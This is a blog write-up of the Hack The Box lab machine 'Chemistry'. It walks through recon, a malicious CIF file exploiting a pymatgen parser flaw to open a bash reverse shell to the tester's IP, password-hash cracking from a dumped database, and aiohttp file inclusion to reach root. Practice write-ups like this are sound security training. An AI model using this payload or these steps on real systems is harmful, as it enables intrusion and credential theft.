<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>HTB: Chemistry</title>
<meta name="author" content="Lamprinos Chatziioannou" />
<meta name="generator" content="Org Mode" />
<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
</head>
<body>
<div id="org-div-home-and-up">
 <a accesskey="h" href="./index.html"> UP </a>
 |
 <a accesskey="H" href="/index.html"> HOME </a>
</div><div id="content" class="content">
<h1 class="title">HTB: Chemistry</h1>
<div id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#orge020f84">Introduction</a></li>
<li><a href="#orgbc94273">Recon</a>
<ul>
<li><a href="#org2fdbe6b">Nmap</a></li>
<li><a href="#org661b2b7">Nmap Findings</a></li>
<li><a href="#orga1cfdea">Web</a>
<ul>
<li><a href="#org1315d2f">10.129.229.142, port 5000</a></li>
<li><a href="#org38643b5">User enumeration through register</a></li>
<li><a href="#org8e38db7">Gobuster Directory Scanning</a></li>
<li><a href="#orgc3827ac">Dashboard and file structure</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#org51abccc">Reverse as <code>app</code>:</a>
<ul>
<li><a href="#orgd2143a2">The database</a></li>
</ul>
</li>
<li><a href="#org24bd6dd">Shell as <code>rosa</code>:</a></li>
<li><a href="#orgfecc242">Web 2.0</a>
<ul>
<li>
<ul>
<li><a href="#orgaa8d4f6">Gobuster Directory Scanning</a></li>
<li><a href="#orgc6221b8">File Inclusion</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</div>

<div id="outline-container-orge020f84" class="outline-2">
<h2 id="orge020f84"><a href="#orge020f84">Introduction</a></h2>
<div class="outline-text-2" id="text-orge020f84">
<p>
Today&rsquo;s machine is Chemistry, and we&rsquo;re back on track:
</p>

<div class="org-src-container">
<pre class="src src-shell" id="org9742640"><span class="org-builtin">echo</span> -e <span class="org-string">"IP=10.129.229.142\nmachine=~/Chemistry"</span> | tee -a ~/.zshrc &amp;&amp; <span class="org-builtin">source</span> ~/.zshrc &amp;&amp; mkdir $<span class="org-variable-name">machine</span> &amp;&amp; tmux 
</pre>
</div>
</div>
</div>

<div id="outline-container-orgbc94273" class="outline-2">
<h2 id="orgbc94273"><a href="#orgbc94273">Recon</a></h2>
<div class="outline-text-2" id="text-orgbc94273">
</div>
<div id="outline-container-org2fdbe6b" class="outline-3">
<h3 id="org2fdbe6b"><a href="#org2fdbe6b">Nmap</a></h3>
<div class="outline-text-3" id="text-org2fdbe6b">
<div class="org-src-container">
<pre class="src src-bash" id="orgd31ff76">mkdir -p <span class="org-string">"$machine/nmap"</span>; nmap -sV -Pn -sC -oA <span class="org-string">"$machine/nmap/initial"</span> $<span class="org-variable-name">IP</span>; sleep 10; nmap -p- $<span class="org-variable-name">IP</span> -oA <span class="org-string">"$machine/nmap/fullports"</span> 
<span class="org-comment-delimiter"># </span><span class="org-comment">If ports found something extra:</span>
nmap -p$<span class="org-variable-name">ports</span> -sC -sV $<span class="org-variable-name">IP</span>
</pre>
</div>
</div>
</div>

<div id="outline-container-org661b2b7" class="outline-3">
<h3 id="org661b2b7"><a href="#org661b2b7">Nmap Findings</a></h3>
<div class="outline-text-3" id="text-org661b2b7">
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> Number of open ports: 2
<ul class="org-ul">
<li>22, 5000</li>
</ul></li>
<li class="off"><code>[&#xa0;]</code> Number of filtered ports: 998</li>
<li class="off"><code>[&#xa0;]</code> Target OS: Linux</li>
<li class="off"><code>[&#xa0;]</code> Service running on each port:
<ul class="org-ul">
<li>22: ssh: OpenSSH 8.2p1</li>
<li>5000: upnp? (HTTP server)
<ul class="org-ul">
<li>I see Werkzeug/3.0.3</li>
</ul></li>
</ul></li>
<li class="off"><code>[&#xa0;]</code> Check for readily available exploits
<ul class="org-ul">
<li>nothing obvious</li>
</ul></li>
</ul>
</div>
</div>

<div id="outline-container-orga1cfdea" class="outline-3">
<h3 id="orga1cfdea"><a href="#orga1cfdea">Web</a></h3>
<div class="outline-text-3" id="text-orga1cfdea">
</div>
<div id="outline-container-org1315d2f" class="outline-4">
<h4 id="org1315d2f"><a href="#org1315d2f">10.129.229.142, port 5000</a></h4>
<div class="outline-text-4" id="text-org1315d2f">
<p>
We see that this website is a tool called &ldquo;Chemistry CIF Analyzer&rdquo;,
allowing us to update a file and the backend <i>should</i> analyze the
structural data within
</p>

<pre class="example" id="org84fa961">
http://10.129.229.142:5000 
</pre>



<div id="org93cfd2b" class="figure">
<p><img src="images/20241030_105015_screenshot.png" alt="20241030_105015_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>Homepage</p>
</div>


<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> Check Wappalyzer output
<ul class="org-ul">
<li>does not give absolutely anything</li>
</ul></li>
<li class="off"><code>[&#xa0;]</code> Check for CMS being used/other obvious software</li>
<li class="off"><code>[&#xa0;]</code> See the source code for leaking information</li>
<li class="off"><code>[&#xa0;]</code> Open burp suite and crawl a little bit</li>
</ul>
</div>
</div>


<div id="outline-container-org38643b5" class="outline-4">
<h4 id="org38643b5"><a href="#org38643b5">User enumeration through register</a></h4>
<div class="outline-text-4" id="text-org38643b5">
<ul class="org-ul">
<li>If we try to register ad <code>admin</code> we see that an account with that
username already exists</li>
</ul>
</div>
</div>


<div id="outline-container-org8e38db7" class="outline-4">
<h4 id="org8e38db7"><a href="#org8e38db7">Gobuster Directory Scanning</a></h4>
<div class="outline-text-4" id="text-org8e38db7">
<p>
Off now to check with gobuster:
</p>

<div class="org-src-container">
<pre class="src src-bash" id="orgb4dc72b"><span class="org-variable-name">domain</span>=10.129.229.142:5000; gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">domain</span> -o $<span class="org-variable-name">machine</span>/$<span class="org-variable-name">domain</span>.gobuster.big 
</pre>
</div>
</div>

<ul class="org-ul">
<li><a id="org90829d2"></a><a href="#org90829d2">Gobuster Findings</a><br>
<div class="outline-text-5" id="text-org90829d2">
<pre class="example" id="org8b99f72">
/dashboard            (Status: 302) [Size: 235] [--&gt; /login?next=%2Fdashboard]
/login                (Status: 200) [Size: 926]
/logout               (Status: 302) [Size: 229] [--&gt; /login?next=%2Flogout]
/register             (Status: 200) [Size: 931]
/upload               (Status: 405) [Size: 153]
</pre>
</div>
</li>
</ul>
</div>


<div id="outline-container-orgc3827ac" class="outline-4">
<h4 id="orgc3827ac"><a href="#orgc3827ac">Dashboard and file structure</a></h4>
<div class="outline-text-4" id="text-orgc3827ac">

<div id="orgf78e84c" class="figure">
<p><img src="images/20241030_105418_screenshot.png" alt="20241030_105418_screenshot.png">
</p>
<p><span class="figure-number">Figure 2: </span>Dashboard</p>
</div>


<p>
Ok so cif files are plain-text files, and as seen <a href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f">here</a>, if we suppose
that the backend is pymatgen we can get it to execute python code. I
changed it just a little bit to see if we would get a pingback,
however it did not work:
</p>

<pre class="example" id="orgaca2920">
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'bash -i &gt;&amp; /dev/tcp/10.10.14.29/8000 0&gt;&amp;1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
</pre>


<p>
Instead what we got was &ldquo;Internal Server Error&rdquo;. I then tested again
to see what we get under normal execution:
</p>


<div id="org3273f7c" class="figure">
<p><img src="images/20241030_110200_screenshot.png" alt="20241030_110200_screenshot.png">
</p>
<p><span class="figure-number">Figure 3: </span>Normal execution</p>
</div>


<p>
At some point, I got a callback! I just had to insert the crucial part
of the payload <b>right after</b> the example file.
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-org51abccc" class="outline-2">
<h2 id="org51abccc"><a href="#org51abccc">Reverse as <code>app</code>:</a></h2>
<div class="outline-text-2" id="text-org51abccc">
<pre class="example" id="orgac3e2a1">
export TERM=xterm; SHELL=/bin/bash script -q /dev/null
</pre>

<ul class="org-ul">
<li>not strange suid files</li>
<li>no strange groups</li>
<li>no interesting cronjobs</li>
<li>checking out the files in local directory:
<ul class="org-ul">
<li>there is a database <code>instance/database.db</code>, which I copied to my
localhost to check it out</li>
</ul></li>
</ul>
</div>

<div id="outline-container-orgd2143a2" class="outline-3">
<h3 id="orgd2143a2"><a href="#orgd2143a2">The database</a></h3>
<div class="outline-text-3" id="text-orgd2143a2">
<ul class="org-ul">
<li>sqlite 3 database</li>
<li>after running our client we can see that:</li>
<li>there is a table called <code>user</code>, with
<ul class="org-ul">
<li>ids, username and passwords</li>
<li>we can get a lot of credentials this way, but the ones we probably
care for are: admin, (app) and rosa</li>
</ul></li>
</ul>


<p>
The <code>rosa</code> hash is easily breakable through hashcat
</p>
</div>
</div>
</div>

<div id="outline-container-org24bd6dd" class="outline-2">
<h2 id="org24bd6dd"><a href="#org24bd6dd">Shell as <code>rosa</code>:</a></h2>
<div class="outline-text-2" id="text-org24bd6dd">
<p>
First things first, we get the <code>user.txt</code> flag.
</p>
<ul class="org-ul">
<li>We can not run sudo
<ul class="org-ul">
<li>but strangely we get &ldquo;sudo<sub>as</sub><sub>admin</sub><sub>successful</sub>&rdquo;</li>
</ul></li>
<li>We are not part of any other groups</li>
<li>Can&rsquo;t see exceptional suid files</li>
<li>Nor any ordinary files</li>
<li><b>BUT</b> <code>ss -tulnp</code> (I always forget to check ports), and we see that
there is a service on 8080</li>
</ul>

<p>
To get port forwarding natively while we still have our ssh cli:
</p>
<div class="org-src-container">
<pre class="src src-shell">ssh rosa@$<span class="org-variable-name">IP</span>  -o <span class="org-variable-name">EnableEscapeCommandline</span>=yes
</pre>
</div>
</div>
</div>

<div id="outline-container-orgfecc242" class="outline-2">
<h2 id="orgfecc242"><a href="#orgfecc242">Web 2.0</a></h2>
<div class="outline-text-2" id="text-orgfecc242">

<div id="orgf683edd" class="figure">
<p><img src="images/20241030_120705_screenshot.png" alt="20241030_120705_screenshot.png">
</p>
<p><span class="figure-number">Figure 4: </span>Site Monitoring dashboard</p>
</div>




<p>
We see that this page is an ad service or something like that.
</p>

<pre class="example" id="org50ff60a">
http://localhost:8081 
</pre>

<p>
Through the <code>List Services</code> functionality we can see that in all
probability we will be able to (re)start a service to get privesc?
</p>
<ul class="org-ul">
<li>Said functionality seem to not be working</li>
<li><p>
We need to exploit this website as well
</p>

<p>
We see that the website uses aiohttp, and a version vulnerable to
file inclusion (3.9.1)
</p></li>
</ul>
</div>


<div id="outline-container-orgaa8d4f6" class="outline-4">
<h4 id="orgaa8d4f6"><a href="#orgaa8d4f6">Gobuster Directory Scanning</a></h4>
<div class="outline-text-4" id="text-orgaa8d4f6">
<p>
Off now to check with gobuster:
</p>

<div class="org-src-container">
<pre class="src src-bash" id="orge70b92c"><span class="org-variable-name">domain</span>=localhost:8081; gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">domain</span> -o 8081.gobuster.big  
</pre>
</div>

<pre class="example" id="org554fb98">
/assets               (Status: 403) [Size: 14]
</pre>
</div>
</div>

<div id="outline-container-orgc6221b8" class="outline-4">
<h4 id="orgc6221b8"><a href="#orgc6221b8">File Inclusion</a></h4>
<div class="outline-text-4" id="text-orgc6221b8">
<p>
Using the exploit <a href="https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh">here</a> we can get access to practically every file on
the target system. I did not bother getting access (though, for the
sake of practice, I did get a shell by retrieving the ssh key): we can
just get root.txt 
</p>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script> <p class=\"date footer\"> Originally created on 2024-10-30 Wed 10:38</p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.<br> <a href="https://github.com/chatziiola"> <i class="fa-brands fa-github"></i> </a> <a href="https://www.linkedin.com/in/chatziiola"> <i class="fa-brands fa-linkedin"></i> </a> </p>
</div>
</body>
</html>
